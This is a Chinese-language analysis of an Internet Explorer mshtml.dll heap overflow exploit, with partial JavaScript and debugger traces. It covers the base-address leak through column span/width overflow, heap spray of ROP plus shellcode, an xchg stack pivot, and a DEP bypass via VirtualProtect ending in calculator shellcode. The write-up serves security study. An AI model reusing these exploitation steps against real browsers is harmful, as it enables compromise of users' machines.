    var free = "EEEE";
    while ( free.length &nbsp;
就这里来说，程序将为其分配0x1C*9=0xFC字节大小的堆空间，而在布局时释放掉的那些堆空间大小为0x100字节，所以最后释放掉的那块堆空间将会重新分配来保存column的样式信息，最终内存中的分布会是如下这个样子：
图3 堆溢出前内存中的布局结构
为了计算mshtml.dll模块的基址，我们需要获取黄色区域标识的vftable数值，这里利用了堆溢出，同样，也是通过js代码动态更新span属性值的方式来达到目的：
    function leak() {
        var leak_col = document.getElementById("132");
        leak_col.width = "41";
        leak_col.span = "19";
    }
由于写入的样式信息个数超过了申请的堆空间所能容纳的个数，所以会造成堆溢出，此时的内存布局如下：
图4 堆溢出后内存中的布局结构
可以看到字符串B对应的长度字段值由原来的0x000000fa变成了0x00010048，因此该对象能访问的内存空间变广了，这样我们就能通过如下代码获取到CButtonLayout对象的vftable值，也就是黄色区域标识的数值，并最终计算得到mshtml.dll模块的基址：
wzxhzdk:5
我们可以验证下：
wzxhzdk:6
其中，0x6b8e8690-1410704=0x6B790000，因此mshtml.dll模块的基址就成功获取到了。
#### 3\. Heap Spray
在得到mshtml.dll模块的基址后，我们就有机会构造相应ROP链来实现想要的功能了，那么现在需要解决另一个问题，也就是如何让程序跳到我们的ROP链中执行。此Exp首先会利用堆喷技术将ROP链中的Gadget地址和参数以及后面用到的shellcode布局到进程地址空间中的固定位置，而后再利用堆溢出重写CButtonLayout对象的虚表指针，使其指向前面提到的固定位置，这样当虚函数被调用时就会跳转到我们的ROP链中。
简单来说，堆喷是一种payload布局技术，能够保证将payload放置到我们可预测的地址处。接下来我们通过此Exp来跟一下这个过程，首先看下CButtonLayout对象的虚表指针是如何控制调用流程的：
图5 正常情况下的虚表指针（黄色标识）
wzxhzdk:7
注意到最后的那个call调用，跳转地址是由虚表指针指向的内容决定的，如果我们将这个指针改掉，使其指向我们能够控制的且包含ROP+shellcode的地址空间，那么我们的目的也就达到了。同样，堆溢出还是通过动态修改span属性值的方式来触发，其中，span的值需要保证溢出到虚表指针处，而width的值我们留在后面讨论：
wzxhzdk:8
溢出后内存中的分布就变成了下述样子，原先的虚表指针被重写了，对应数值为width属性值1278888*100=0x079f6da0:
图6 通过堆溢出重写虚表指针
而0x079f6da0这个地址对应的进程空间我们可以通过堆喷进行控制，此时其中的内容为：
图7 ROP+shellcode在进程空间中的分布
接下来我们重点看下堆喷，如下是由Vmmap工具观察到的堆喷时进程地址空间的变化情况，其中，橘黄色标识的部分为堆空间数据，这里总共喷了100M字节大小的数据，从时间图可以看出堆空间的分配有个急剧的增长过程：
图8 堆喷时的进程地址空间变化
如下是单次堆喷数据的组织形式：
        //初始化堆喷数据
        var padding = unescape("%u9090");
        while (padding.length 0x10000字节->0x100000字节的组织过程。此外，由于堆空间管理的对齐性质，当然了，还有前面提到的彼此相邻的性质，所以分配到的堆空间将类似下面这个样子：
图9 堆喷时分配到的堆空间（部分）
通过分析可以知道对于申请大小为0x100000字节的堆空间会有0x24字节的首部和0x02字节的尾部，同时Exp中在ROP+shellcode之前会有如下的填充字节：
        var shellcode = unescape("%u4141%u4141%u4242%u4242%u4343%u4343");
        shellcode+= unescape("%u4141%u4141%u4242%u4242%u4343%u4343");
        shellcode+= unescape("%u4141%u4141"); // PADDING
综上分析，我们就可以计算出ROP+shellcode在进程空间中的分布情况了，如下代码是用于计算从地址空间0x07500000开始到0x08000000中符合条件的所有width属性值，从中选出一个能稳定利用的就可以了：
        for(i=0x07500000; i  g
    Breakpoint 1 hit
    eax=079f6da0 ebx=01000000 ecx=02f22610 edx=00000041 esi=0232cfd8 edi=02f1f108
    eip=6b8fe663 esp=0232ce18 ebp=0232ce48 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    mshtml!NotifyElement+0x3d:
    6b8fe663 56              push    esi
    0:005> p
    eax=079f6da0 ebx=01000000 ecx=02f22610 edx=00000041 esi=0232cfd8 edi=02f1f108
    eip=6b8fe664 esp=0232ce14 ebp=0232ce48 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    mshtml!NotifyElement+0x3e:
    6b8fe664 ff5008          call    dword ptr [eax+8]    ds:0023:079f6da8=6b74b43b
    0:005> dd eax
    079f6da0  6b731041 6b732c60 6b74b43b 6b732c60
    079f6db0  6b732c60 6b733059 00001024 6b7cced0
    079f6dc0  00000040 6b732fa9 6bc6fe20 6b7330ae
    079f6dd0  6b731041 6b732f0b 6b73f920 6b744ef7
    079f6de0  6b731348 6b79f0bb 6b7694a1 6b793d7e
    079f6df0  90909090 90909090 90909090 0089e8fc
    079f6e00  89600000 64d231e5 8b30528b 528b0c52
    079f6e10  28728b14 264ab70f c031ff31 7c613cac
    0:005> u 6b74b43b L3
    mshtml!CTreeNode::GetParentWidth+0x9c:
    6b74b43b 94              xchg    eax,esp
    6b74b43c c3              ret
    6b74b43d 8bf0            mov     esi,eax
    0:005> t
    eax=079f6da0 ebx=01000000 ecx=02f22610 edx=00000041 esi=0232cfd8 edi=02f1f108
    eip=6b74b43b esp=0232ce10 ebp=0232ce48 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    mshtml!CTreeNode::GetParentWidth+0x9c:
    6b74b43b 94              xchg    eax,esp
    0:005> p
    eax=0232ce10 ebx=01000000 ecx=02f22610 edx=00000041 esi=0232cfd8 edi=02f1f108
    eip=6b74b43c esp=079f6da0 ebp=0232ce48 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    mshtml!CTreeNode::GetParentWidth+0x9d:
    6b74b43c c3              ret
    0:005> dd esp
    079f6da0  6b731041 6b732c60 6b74b43b 6b732c60
    079f6db0  6b732c60 6b733059 00001024 6b7cced0
    079f6dc0  00000040 6b732fa9 6bc6fe20 6b7330ae
    079f6dd0  6b731041 6b732f0b 6b73f920 6b744ef7
    079f6de0  6b731348 6b79f0bb 6b7694a1 6b793d7e
    079f6df0  90909090 90909090 90909090 0089e8fc
    079f6e00  89600000 64d231e5 8b30528b 528b0c52
    079f6e10  28728b14 264ab70f c031ff31 7c613cac
栈转移就是要把布局有ROP信息的堆地址放到esp寄存器中，可以通过交换或者写入的方式，比如mov、pop、xchg等，当然，具体使用什么样的Gadget还需要由当前程序的特点来决定。
#### 5\. DEP
下面进入最后一部分内容，我们的最终目的是要执行内存中布置好的shellcode，但由于系统采用了DEP（Data Execution
Prevention）技术，它会借助一系列的软硬件方法对内存进行检查，所以堆栈上的shellcode是不能直接执行的。接下来我们就分析下此Exp是如何进行DEP绕过的，也就是ROP部分实现的功能，如下是利用堆栈执行恶意操作的示意图：
图11 利用堆栈执行恶意操作
首先我们介绍下VirtualProtect函数，它可用来改变进程中页面的保护属性，具体定义如下：
wzxhzdk:13
其中，lpAddress和dwSize表示待设置页面的起始地址和大小，flNewProtect为保护方式，当它的值为0x00000040时表示PAGE_EXECUTE_READWRITE，这正是我们后面要设置的，lpflOldProtect则指向可写区域用于保存原先的保护属性。
ROP链中将借助此函数来改变shellcode所在堆空间的页面保护属性，通过跟踪可知当栈转移完成后就进入到ROP链的执行流程，刚开始的几个Gadget会先将VirtualProtect的调用参数pop到相应寄存器中，而后再执行pushad指令将这些寄存器压入栈中，即模拟call调用时的参数压栈操作，最后调用VirtualProtect函数来修改页面的保护属性，我们可以看下这个过程：
wzxhzdk:14
最终程序会转到弹出计算器的shellcode上执行。
### 0x02 参考
  * 
  * 
  * 
  *  
* * *